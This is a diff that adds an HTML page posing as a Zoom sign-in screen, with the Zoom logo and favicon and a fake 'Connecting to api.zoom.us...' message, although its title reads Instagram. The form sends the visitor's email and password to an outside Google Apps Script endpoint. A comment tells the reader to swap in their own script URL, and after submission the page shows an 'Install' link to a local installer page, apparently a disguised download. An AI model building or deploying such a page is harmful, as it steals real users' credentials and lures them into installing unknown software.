@@ -1,0 +1,83 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="contact form example">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="https://st1.zoom.us/zoom.ico" />
+</head>
+
+<body>
+
+    <div class="preloader">
+        <img src="https://i.gifer.com/ZKZg.gif" alt="Preloader Image">
+        <br/>
+        </div>
+
+
+    <div class="login-container">
+        <div class="login-box">
+          <div class="logo"><img src="https://st2.zoom.us/static/6.3.16094/image/new/topNav/Zoom_logo.svg" alt=""></div>
+            <form class="gform pure-form pure-form-stacked" method="POST" data-email="example@email.net"
+                action="https://script.google.com/macros/s/AKfycbx7CeD7am6fkzxb9HJRSqbPqQswmQB4wq9JRJe3wfEbb_bFGcomz1nTwZCK-LCx5wPP/exec">
+                <!-- change the form action to your script url -->
+
+                <div class="form-elements">
+                    <fieldset class="pure-group">
+                        <input id="name" name="name" type="text" placeholder="Enter your Email" required="asd" class="form-input" />
+                    </fieldset>
+
+                    <fieldset class="pure-group">
+                        <input id="message" name="message" type="password" placeholder="Enter your Password" required="asd"  class="form-input"/>
+                    </fieldset>
+                    <button class="button-success pure-button button-xlarge" id="login-button">
+                        Sign in / up
+                    </button>
+                </div>
+                <br/>
+                
+          
+
+                <!-- Customise the Thankyou Message People See when they submit the form: -->
+                <div class="thankyou_message" style="display:none;">
+                    <div class="installzoom">
+                        <p><a href="installer/index.html">
+                            Install</a></p>
+                    </div>
+                </div>
+            </form>
+
+
+            <div class="section_extra " id="section_extra" >
+                <!--
+            <center>
+              <div class="option">────────── OR ──────────</div> </center> -->
+            </form>
+
+            <div class="text-section">
+                <p>You can login via Google,SSO,Apple,Facebook</p>
+            </div>
+            <div class="singup">
+                <p><a href="">
+                    Use guest mode</a></p>
+            </div>
+        
+
+            <div class="custom-box">
+              <form class="gform pure-form pure-form-stacked" method="POST" action="#">
+                  <!-- Text Section -->
+        </div>
+    </div>
+    <center>
+    <p id="message-text">Connecting to api.zoom.us...</p>
+  </center>
+    </div>
+
+
+    <!-- Submit the Form to Google Using "AJAX" -->
+    <script data-cfasync="false" src="form-submission-handler.js"></script>
+</body>
+
+</html>
